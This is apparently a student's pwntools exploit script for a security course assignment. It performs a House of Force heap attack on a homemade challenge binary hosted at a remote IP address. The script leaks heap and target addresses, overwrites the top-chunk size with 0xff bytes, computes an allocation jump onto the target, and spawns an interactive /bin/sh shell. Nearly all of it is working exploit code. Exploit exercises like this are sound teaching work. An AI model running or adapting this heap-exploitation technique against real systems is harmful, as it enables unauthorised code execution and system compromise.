'''
Creators:       Malachi Parks
Section:        CPEG476-010
Assignment:     PCP23: 
File Description:  House of Force on a homemade binary created by andy

Checksec info:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    PIE enabled     No RPATH   No RUNPATH   54) Symbols       No    0               2               PCP23

File info:
PCP23: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=599cce1bcb9d78f2c8309f4e8ea8166ff5ab9ff4, for GNU/Linux 3.2.0, not stripped
'''

# Importing Libaries
from pwn import *
import re

# File information
filename = "./PCP23"
elf = ELF(filename)
context.arch = 'amd64'

# Variables to be sent
name=b"Malachi"
minChunkSize=b"24"
overwriteTop=b"\xff"*32
heapLeak=b""
sysCall=b""
junk=b"This is a trash chunk bois"

# Start process
# p = process(filename)
p = remote("165.22.46.243",8969)

# Set up small chunk to overwrite topchunk
p.sendlineafter(b"No, really.)",name)
p.sendlineafter(b"what size?:",minChunkSize)

# Grabbing heap leak
p.recvuntil(b"Your chunk m'lady: ")
heapLeak=p.recvuntil(b"\n")

# Finish overwriting the topchunk
p.sendlineafter(b"What would you like to store in this fine chunk?:",overwriteTop)
resp=p.recvrepeat(1)

# Store Leaks
leak=re.findall(b"(0x[0-9a-f]{6,16})",resp)
sysCall=leak[0]

# Converting leaks to decimal
heapLeakInt = int(heapLeak,16)
sysCallInt = int(sysCall, 16)

# Calculating Next Chunk and gap
mychunk = heapLeakInt+32    # due to small size, only should be a jump from the start of over chunk to next chunk
gap = sysCallInt - mychunk  # Figure out distance between the next malloc to overwrite this piece
jumpsize = gap - 16   # want to padd way up to target instead of right onto it

# Send line of jump size then send junk then create new chunk, should alloc right onto targer
p.sendline(str(jumpsize))
p.sendline(junk)
p.sendline(b"32")

# Pop a shell by using binsh
p.sendline(b"/bin/sh\x00")
p.interactive()